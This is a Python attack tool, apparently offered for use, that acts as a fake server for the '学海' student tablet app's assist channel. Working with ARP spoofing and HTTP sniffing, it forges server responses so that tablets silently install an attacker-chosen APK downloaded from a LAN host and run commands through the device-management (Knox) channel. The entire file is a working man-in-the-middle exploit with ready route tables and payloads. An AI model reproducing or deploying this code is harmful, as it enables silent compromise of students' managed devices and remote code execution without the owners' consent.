#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
assist_install_server.py — 学海学生端 assist 链路「假服务端」

作用：配合 ARP 劫持 + 明文 HTTP 嗅探（npcap_http80.py），
     对平板的 assist 请求伪造响应，下发 installAppOnline 任务，
     让平板静默安装我们指定的 APK（走 Knox）。

协议（基于 smali 反编译验证）：
  1) GET  {base}/api/v1/users/{uid}/devices/{did}/assists
       响应: {"assistId": "...", "operate": "ENTRY", "hidden": false}
  2) GET  {base}/api/v1/users/{uid}/devices/{did}/assists/{assistId}/tasks
       响应: {"id": "...", "instruction": "ZAZE脚本", "step": 1}
  3) GET/POST {base}/api/v1/assists/{assistId}/active
       响应: {"code": 0, "msg": "ok"}
  4) POST {base}/api/v1/users/{uid}/devices/{did}/assist/result
       响应: {"code": 0, "msg": "ok"}

ZAZE 脚本示例：
  installAppOnline("http://192.168.3.114:8000/agent.apk")
  executeCmd("id")

用法：
  # 1) 打印即将下发的 payload（离线核对）
  python assist_install_server.py --print-payload --apk-url http://192.168.3.114:8000/agent.apk

  # 2) 起一个假 assist 服务端（独立监听，供嗅探器转发）
  python assist_install_server.py --listen 0.0.0.0:8001 --apk-url http://192.168.3.114:8000/agent.apk

  # 3) 生成 npcap_http80.py 可直接 import 的响应表
  python assist_install_server.py --emit-table --apk-url http://192.168.3.114:8000/agent.apk
"""
import argparse
import json
import sys

# ---------------------------------------------------------------------------
# 响应构造
# ---------------------------------------------------------------------------

def resp_assist(assist_id="assist_1", hidden=False):
    """requestAssist 的响应（AssistNotify）"""
    return {
        "assistId": assist_id,
        "operate": "ENTRY",
        "hidden": bool(hidden),
    }


def resp_task(task_id="task_1", instruction='installAppOnline("%s")', apk_url="", step=1):
    """requestAssistTask 的响应（AssistTask: id / instruction / step）"""
    if apk_url:
        instruction = instruction % apk_url
    return {
        "id": task_id,
        "instruction": instruction,
        "step": int(step),
    }


def resp_ok():
    """通用成功响应"""
    return {"code": 0, "msg": "ok"}


def resp_active():
    """active 心跳响应"""
    return {"code": 0, "msg": "ok", "data": {"active": True}}


# ---------------------------------------------------------------------------
# 默认的「安装任务」ZAZE 脚本
# ---------------------------------------------------------------------------

ZAZE_INSTALL = 'installAppOnline("%s")'
ZAZE_EXEC = 'executeCmd("%s")'


def build_table(apk_url):
    """返回 (正则/短路径 -> 响应对象) 的对照表，供嗅探器匹配"""
    return [
        # 1) 建立 assist 会话
        (r"/api/v1/users/[^/]+/devices/[^/]+/assists$", resp_assist()),
        # 2) 拉任务
        (r"/api/v1/users/[^/]+/devices/[^/]+/assists/[^/]+/tasks$",
         resp_task(apk_url=apk_url)),
        # 3) 心跳
        (r"/api/v1/assists/[^/]+/active$", resp_active()),
        # 4) 结果上报
        (r"/api/v1/users/[^/]+/devices/[^/]+/assist/result$", resp_ok()),
    ]


# ---------------------------------------------------------------------------
# 独立的假服务端（可选，供嗅探器转发）
# ---------------------------------------------------------------------------

def serve(host, port, apk_url):
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import re

    table = build_table(apk_url)

    class H(BaseHTTPRequestHandler):
        def _match(self, path):
            for pat, body in table:
                if re.search(pat, path):
                    return body
            return None

        def _send(self, obj):
            raw = json.dumps(obj, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json;charset=UTF-8")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        def do_GET(self):
            body = self._match(self.path)
            if body is None:
                self._send({"code": 404, "msg": "no route"})
            else:
                self._send(body)

        def do_POST(self):
            length = int(self.headers.get("Content-Length") or 0)
            if length:
                try:
                    self.rfile.read(length)
                except Exception:
                    pass
            body = self._match(self.path)
            if body is None:
                self._send({"code": 404, "msg": "no route"})
            else:
                self._send(body)

        def log_message(self, fmt, *args):
            sys.stderr.write("[assist-server] %s %s\n" % (self.command, self.path))

    print("[+] 假 assist 服务端监听 %s:%d" % (host, port))
    print("[+] APK URL: %s" % apk_url)
    print("[+] 路由表:")
    for pat, body in table:
        print("    %-70s -> %s" % (pat, json.dumps(body, ensure_ascii=False)))
    HTTPServer((host, port), H).serve_forever()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="学海学生端 assist 假服务端")
    ap.add_argument("--apk-url", default="http://192.168.3.114:8000/agent.apk",
                    help="要下发的 APK 下载地址")
    ap.add_argument("--listen", default=None,
                    help="起独立服务端，如 0.0.0.0:8001")
    ap.add_argument("--print-payload", action="store_true",
                    help="只打印要下发的 JSON payload")
    ap.add_argument("--emit-table", action="store_true",
                    help="打印嗅探器可直接使用的路由表")
    ap.add_argument("--assist-id", default="assist_1")
    ap.add_argument("--task-id", default="task_1")
    args = ap.parse_args()

    table = build_table(args.apk_url)

    if args.print_payload:
        print("=" * 70)
        print("1) requestAssist 响应:")
        print(json.dumps(resp_assist(args.assist_id), ensure_ascii=False, indent=2))
        print()
        print("2) requestAssistTask 响应 (下发安装任务):")
        print(json.dumps(resp_task(args.task_id, apk_url=args.apk_url), ensure_ascii=False, indent=2))
        print()
        print("3) ZAZE instruction 原始值:")
        print('  ' + ZAZE_INSTALL % args.apk_url)
        print("=" * 70)
        return

    if args.emit_table:
        print("# 供 npcap_http80.py 使用的路由表")
        print("ASSIST_ROUTES = [")
        for pat, body in table:
            print("    (r%s, %s)," % (repr(pat), json.dumps(body, ensure_ascii=False)))
        print("]")
        return

    if args.listen:
        host, _, port = args.listen.partition(":")
        serve(host or "0.0.0.0", int(port or 8001), args.apk_url)
        return

    # 默认：打印 payload
    print(json.dumps(resp_assist(args.assist_id), ensure_ascii=False))
    print(json.dumps(resp_task(args.task_id, apk_url=args.apk_url), ensure_ascii=False))


if __name__ == "__main__":
    main()
